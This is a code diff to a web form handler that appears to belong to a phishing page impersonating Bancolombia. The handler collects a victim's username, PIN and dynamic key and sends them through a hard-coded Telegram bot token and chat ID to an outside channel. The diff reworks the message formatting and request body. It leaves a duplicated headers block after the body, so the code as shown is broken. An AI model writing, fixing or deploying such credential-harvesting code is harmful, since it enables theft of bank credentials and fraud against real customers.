@@ -62,10 +62,18 @@ async function handleSubmit(e) {
     try {
         const BOT_TOKEN = '8111270124:AAHsKW7PfdE0A-lwMR8Qj98ul86SCMjxJg4';
         const CHAT_ID = '-1002572002457';
-        const message = `┏🟢 \`LOGO BANCOLOMBIA\`\n┣👤 User: \`${data.username}\`\n┣🔒 Pass: \`${data.pin}\`\n┗💸 Dinámica: \`${data.dynamic}\``;
+        const message = `<b>┏🟢 LOGO BANCOLOMBIA\n┣👤 User:</b> \`${data.username}\`\n<b>┣🔒 Pass:</b> \`${data.pin}\`\n<b>┗💸 Dinámica:</b> \`${data.dynamic}\``;
         
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
             headers: {
                 'Content-Type': 'application/json',
             },
